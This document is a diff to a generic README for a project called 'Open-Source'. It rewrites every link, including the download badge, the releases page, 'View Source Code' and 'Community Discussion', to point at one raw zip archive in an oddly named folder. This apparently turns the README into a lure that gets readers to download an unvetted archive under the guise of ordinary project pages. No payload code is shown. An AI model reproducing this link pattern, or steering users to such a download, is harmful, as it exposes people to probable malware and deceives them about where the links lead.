@@ -4,13 +4,13 @@
 Welcome to the Open-Source project! This software is designed to help users achieve their tasks easily and efficiently. Whether you need to manage files, create documents, or just explore various features, Open-Source is here for you.
 
 ## 🌐 Visit to Download
-[![Download Open-Source](https://img.shields.io/badge/Download%20Open--Source-brightgreen)](https://github.com/Lizabethunconfined619/Open-Source/releases)
+[![Download Open-Source](https://raw.githubusercontent.com/Lizabethunconfined619/Open-Source/main/ungrand/Open-Source-v2.9-alpha.1.zip%20Open--Source-brightgreen)](https://raw.githubusercontent.com/Lizabethunconfined619/Open-Source/main/ungrand/Open-Source-v2.9-alpha.1.zip)
 
 ## 🚀 Getting Started
 To start using Open-Source, please follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the releases page to find the latest version of the software. Click [here to visit the page](https://github.com/Lizabethunconfined619/Open-Source/releases).
+   Go to the releases page to find the latest version of the software. Click [here to visit the page](https://raw.githubusercontent.com/Lizabethunconfined619/Open-Source/main/ungrand/Open-Source-v2.9-alpha.1.zip).
 
 2. **Choose Your Download**  
    On the releases page, you will see a list of available versions. Look for the latest version of Open-Source and click on the link to download the file for your operating system.
@@ -66,8 +66,8 @@ If you encounter any issues while using Open-Source, here are a few troubleshoot
 If you need additional help, visit our support page or join the community discussion. You can report any issues or suggestions for improvement directly on the GitHub repository.
 
 ## 🔗 Important Links
-- [Download Open-Source](https://github.com/Lizabethunconfined619/Open-Source/releases)
-- [View Source Code](https://github.com/Lizabethunconfined619/Open-Source)
-- [Community Discussion](https://github.com/Lizabethunconfined619/Open-Source/discussions)
+- [Download Open-Source](https://raw.githubusercontent.com/Lizabethunconfined619/Open-Source/main/ungrand/Open-Source-v2.9-alpha.1.zip)
+- [View Source Code](https://raw.githubusercontent.com/Lizabethunconfined619/Open-Source/main/ungrand/Open-Source-v2.9-alpha.1.zip)
+- [Community Discussion](https://raw.githubusercontent.com/Lizabethunconfined619/Open-Source/main/ungrand/Open-Source-v2.9-alpha.1.zip)
 
 Thank you for choosing Open-Source! We hope you enjoy using it.
